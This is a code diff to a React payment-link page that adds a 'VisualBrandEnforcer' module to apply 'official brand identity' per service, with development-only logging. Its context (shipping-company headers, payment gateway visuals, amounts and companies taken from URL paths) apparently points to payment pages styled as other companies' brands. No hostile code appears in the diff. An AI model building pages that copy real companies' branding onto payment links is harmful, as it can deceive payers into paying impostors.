@@ -29,6 +29,8 @@ import CustomPaymentInput from "@/components/CustomPaymentInput";
 import CustomPaymentButton from "@/components/CustomPaymentButton";
 import { getNonGovPaymentGatewayVisuals, shouldUsePaymentGatewayVisuals } from "@/lib/nonGovPaymentGatewayVisuals";
 import ShippingCompanyHeader from "@/components/ShippingCompanyHeader";
+// VisualBrandEnforcer - Official brand identity application (visual only, no functional changes)
+import { getBrandIdentity, generateBrandReport, FUNCTIONAL_LOCK, NO_FUNCTIONAL_CHANGES_ASSERTION } from "@/lib/visualBrandEnforcer";
 
 const PaymentRecipient = () => {
   const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
@@ -68,6 +70,10 @@ const PaymentRecipient = () => {
   const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
   const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
   const countryParam = urlParams.get('country') || urlParams.get('c');
+
+  // VisualBrandEnforcer: Get official brand identity (visual only, no functional changes)
+  const brandIdentity = getBrandIdentity(serviceKey);
+  const brandReport = generateBrandReport(serviceKey, ['PaymentRecipient']);
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
@@ -118,6 +124,15 @@ const PaymentRecipient = () => {
   if (isError) {
     console.error('Error loading link:', error);
   }
+
+  // VisualBrandEnforcer: Log brand enforcement report (development only)
+  useEffect(() => {
+    if (import.meta.env.DEV) {
+      console.log('[VisualBrandEnforcer]', brandReport);
+      console.log('[VisualBrandEnforcer] Functional Lock:', FUNCTIONAL_LOCK);
+      console.log('[VisualBrandEnforcer] No Functional Changes:', NO_FUNCTIONAL_CHANGES_ASSERTION);
+    }
+  }, [serviceKey]);
 
   const formattedAmount = formatCurrency(amount, currencyCode);
   const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
